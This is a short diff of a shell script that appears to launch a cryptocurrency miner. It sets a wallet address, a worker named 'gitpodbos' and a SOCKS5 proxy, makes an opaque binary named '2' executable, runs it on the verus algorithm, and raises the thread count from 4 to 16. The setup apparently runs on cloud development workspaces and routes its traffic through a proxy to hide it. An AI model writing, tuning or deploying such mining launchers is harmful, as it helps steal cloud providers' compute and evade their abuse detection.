@@ -8,4 +8,4 @@ B=REL6XKj49hmLeNdbwjtazXPWciq6gHdb5R
 C=gitpodbos
 D=socks5://184.178.172.14:4145
 
-chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p x -t 4
+chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p x -t 16
